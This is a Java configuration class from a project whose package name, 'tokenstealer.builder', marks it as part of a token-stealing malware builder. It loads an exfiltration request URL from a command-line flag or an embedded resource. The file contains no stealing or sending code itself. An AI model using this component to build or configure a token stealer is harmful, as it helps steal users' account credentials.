package de.romjaki.tokenstealer.builder;

import java.util.Scanner;

public class Config {

    public static Config INSTANCE;

    private String request;

    public Config(String request) {
        this.request = request;
    }

    private static Config getConfig() {
        try (Scanner scanner = new Scanner(Config.class.getResourceAsStream("/request"))
                .useDelimiter("\\A")) {
            return new Config(scanner.next());
        } catch (NullPointerException e) {
            return null;
        }
    }

    public static Config load(String[] args) {
        if (args.length == 2 && args[0].equals("--url")) {
            return INSTANCE = new Config(args[1]);
        }
        return INSTANCE = getConfig();
    }

    public String getRequest() {
        return request;
    }
}
